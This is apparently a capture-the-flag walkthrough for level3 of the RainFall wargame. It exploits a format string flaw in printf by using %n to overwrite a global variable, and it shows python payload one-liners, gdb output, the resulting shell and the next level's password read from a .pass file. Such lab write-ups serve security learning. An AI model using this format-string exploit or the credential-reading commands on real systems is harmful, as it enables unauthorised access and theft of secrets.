# Walkthrough level3

In this binary we have `fgets()` who is called with a size to read of 512 and
our buffer can store 520 chars. We don't have a buffer overflow but we can see
our buffer is used in the format string of printf:

```bash
level3@RainFall:~$ ./level3
%p
0x200
```

This is potientialy [insecure](https://owasp.org/www-community/attacks/Format_string_attack)
and we are going to exploit this to change the return value of printf to 64.

`printf("%n")` write number of chars print before '%n' and write it
in the value pointed.

payload = "\<address of var to change\> + 60 chars" + "%n"

Check if the address is set:

```bash
level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + '%08x ' * 5)" | ./level3
00000200 b7fd1ac0 b7ff37d0 0804988c 78383025
```

Now we are trying to change the return value of printf. Place a breakpoint,
create the payload, run gdb with the payload as argument and check the return
value:

```gdb
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    eax,ds:0x804988c
=> 0x080484df <+59>:    cmp    eax,0x40

level3@RainFall:~$ python -c "print('\x8c\x98\x04\x08' + '%08x ' * 3 + '%n')" > /tmp/test

(gdb) r < /tmp/test
(gdb) p $eax
$3 = 31

```

Do the same thing but set the value to 64:

```bash
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08' + '%08x ' * 3 + 'A' * 33 + '%n')"; cat ) | ./level3
00000200 b7fd1ac0 b7ff37d0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```
